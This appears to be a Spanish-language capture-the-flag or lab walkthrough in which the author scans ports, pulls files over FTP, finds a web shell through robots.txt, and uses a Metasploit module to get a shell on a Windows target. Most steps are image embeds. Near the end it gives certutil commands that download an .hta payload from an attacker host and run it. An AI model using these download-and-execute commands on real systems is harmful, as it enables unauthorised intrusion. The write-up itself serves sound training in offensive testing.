Puertos escaneados
![[Pasted image 20240702111925.png]]
![[Pasted image 20240702111957.png]]

Accedemos por ftp y nos descargamos los ficheros
![[Pasted image 20240702131908.png]]

Revismos el fichero de robotos y encontramos que ha deshabilitado el fihcero cmdasp.aspx
![[Pasted image 20240702132201.png]]

Revisamos el fichero y el contenido y es una web shell
![[Pasted image 20240702132226.png]]

Al acceder encontramos que podemos ejecutar comandos con los permisos mas altos
![[Pasted image 20240702132320.png]]

Listamos los usuarios del sistema
![[Pasted image 20240702170227.png]]

Ahora ejecutaremos el siguiente modulo de metasploit para realizar una carga maliciosa y obtener acceso al sistema
![[Pasted image 20240702173647.png]]

Ejecuto el modulo
![[Pasted image 20240702173705.png]]

Y en la maquina victima tenemos que descargarnos y ejecutar el payload, para ello ejecutamos los siguientes comandos
```
certutil -urlcache -split -f http://192.168.100.5:8080/yBiCtn2sdHy3c.hta .\exploit.hta
start .\exploit.hta
```

Y ya tendremos acceso a la maquina victima
![[Pasted image 20240702173836.png]]

